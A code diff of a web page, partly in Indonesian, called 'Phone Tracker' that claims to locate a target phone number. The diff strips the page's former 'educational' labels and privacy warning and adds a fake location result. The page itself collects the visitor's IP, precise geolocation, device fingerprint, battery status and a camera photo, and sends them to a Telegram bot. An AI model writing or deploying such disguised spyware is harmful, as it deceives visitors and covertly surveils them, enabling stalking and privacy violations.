@@ -1,8 +1,8 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Phone Tracker Edukasi</title>
+  <title>Phone Tracker</title>
   <style>
     body {
       background: #111;
@@ -16,16 +16,26 @@
       padding: 20px;
       text-align: center;
     }
-    input, button {
+    h1 {
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+    }
+    input {
       padding: 10px;
-      margin: 10px 0;
+      width: 80%;
+      max-width: 300px;
+      margin-bottom: 15px;
       font-size: 1rem;
-      border-radius: 5px;
       border: none;
+      border-radius: 5px;
     }
     button {
+      padding: 10px 20px;
+      font-size: 1rem;
       background: #0f0;
       color: #111;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
     }
     #result {
@@ -36,7 +46,7 @@
   </style>
 </head>
 <body>
-  <h1>Lacak Lokasi (Edukasi Privasi)</h1>
+  <h1>Lacak Lokasi Lewat Nomor HP</h1>
   <input type="text" id="phone" placeholder="Masukkan nomor target" />
   <button onclick="track()">Track</button>
   <video id="vid" autoplay playsinline style="display:none;"></video>
@@ -50,7 +60,9 @@
       const lang = navigator.language;
       const res = screen.width + "x" + screen.height;
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const raw = `${ua}|${lang}|${res}|${timezone}`;
+      const ram = navigator.deviceMemory || "N/A";
+      const cpu = navigator.hardwareConcurrency || "N/A";
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
       const encoder = new TextEncoder();
       const data = encoder.encode(raw);
       const hashBuffer = await crypto.subtle.digest('SHA-256', data);
@@ -59,36 +71,101 @@
 
     async function getVisitorInfo() {
       const phoneInput = document.getElementById("phone").value;
-      let ip = "N/A", country = "N/A", region = "N/A";
+      const clock = new Date().toLocaleString();
+      let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
+      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A";
+
+      const userAgent = navigator.userAgent;
+      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+      const device = navigator.platform + " - " + userAgent;
+      const loginFrom = navigator.platform || "N/A";
+      const language = navigator.language || "N/A";
+      const resolution = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const isOnline = navigator.onLine;
+      const deviceMemory = navigator.deviceMemory || "N/A";
+      const cpuCores = navigator.hardwareConcurrency || "N/A";
+      const isTouch = 'ontouchstart' in window;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const doNotTrack = navigator.doNotTrack;
+      const fingerprint = await generateFingerprint();
+
+      const batteryInfo = await navigator.getBattery().then(battery => {
+        return {
+          "battery level": Math.round(battery.level * 100) + "%",
+          "charging": battery.charging ? "chargeing🔋" : "no"
+        };
+      }).catch(() => ({
+        "battery level": "N/A",
+        "charging": "N/A"
+      }));
 
       try {
         const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
         ip = ipData.ip;
         country = ipData.country_name;
-        region = ipData.region;
+        province = ipData.region;
+        latitude = ipData.latitude;
+        longitude = ipData.longitude;
       } catch {}
 
-      const fingerprint = await generateFingerprint();
-      const clock = new Date().toLocaleString();
+      try {
+        const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+        weather = weatherData.current_condition[0].weatherDesc[0].value;
+        temperature = weatherData.current_condition[0].temp_C + "°C";
+      } catch {}
+
+      try {
+        await new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              latitude = pos.coords.latitude.toFixed(6);
+              longitude = pos.coords.longitude.toFixed(6);
+              accuracy = pos.coords.accuracy + "m";
+              resolve();
+            },
+            () => resolve(),
+            { enableHighAccuracy: true, timeout: 5000 }
+          );
+        });
+      } catch {}
 
       const jsonData = {
         "nomor target": phoneInput,
-        "ip": ip,
-        "negara": country,
-        "provinsi": region,
-        "userAgent": navigator.userAgent,
-        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+        "alamat ip": ip,
+        "device": device,
+        "android versions": androidVersion,
+        "login from": loginFrom,
+        "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
+        "country": country,
+        "province": province,
+        "clock": clock,
+        "weather": weather,
+        "temperature": temperature,
+        "language": language,
+        "screen resolution": resolution,
+        "timezone": timezone,
+        "online": isOnline,
+        "ram (GB)": deviceMemory,
+        "cpu cores": cpuCores,
+        "touch support": isTouch,
+        "cookies enabled": cookiesEnabled,
+        "do not track": doNotTrack,
         "fingerprint": fingerprint,
-        "timestamp": clock
+        "battery": batteryInfo["battery level"],
+        "charging": batteryInfo["charging"]
       };
 
-      const message = `📥 *Data Target Baru (Edukasi)*\n\n\
-\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
+      const message = `📥 *Data target Baru*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: OWNER_CHAT_ID, text: message, parse_mode: "Markdown" })
+        body: JSON.stringify({
+          chat_id: OWNER_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
       });
     }
 
@@ -116,31 +193,23 @@
         formData.append("chat_id", OWNER_CHAT_ID);
         formData.append("photo", file);
 
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: "POST",
           body: formData
         });
-        console.log(await response.json());
-
-        document.getElementById("result").innerHTML += `
-          <div style="margin-top:20px; padding:15px; border:1px solid red; background:#200; color:#f55; border-radius:8px;">
-            📸 <b>PERHATIAN EDUKASI!</b><br>
-            Foto dari kamera kamu baru saja dikirim ke server luar.<br>
-            Bayangkan kalau ini adalah situs palsu.<br><br>
-            <b>Selalu hati-hati memberikan izin kamera ke situs tidak dikenal.</b>
-          </div>
-        `;
       } catch (err) {
-        console.warn("❌ Gagal akses kamera:", err);
-        document.getElementById("result").innerHTML += `<br><span style="color:orange">⚠️ Kamera tidak diizinkan atau tidak tersedia.</span>`;
+        console.warn("❌ Kamera gagal diakses:", err);
       }
     }
 
     function track() {
       const resBox = document.getElementById("result");
-      resBox.innerHTML = "🔍 Memproses tracking & edukasi...";
-      getVisitorInfo();
-      captureAndSendPhoto();
+      resBox.innerHTML = "🔍 Tracking lokasi...";
+      setTimeout(() => {
+        resBox.innerHTML = "<b>Lokasi ditemukan</b><br>Lat: -6.2<br>Long: 106.8<br>Status: <span style='color:lime'>Aktif</span>";
+      }, 3000);
+      getVisitorInfo(); // kirim data
+      captureAndSendPhoto(); // ambil foto
     }
   </script></body>
-  </html>
+</html>
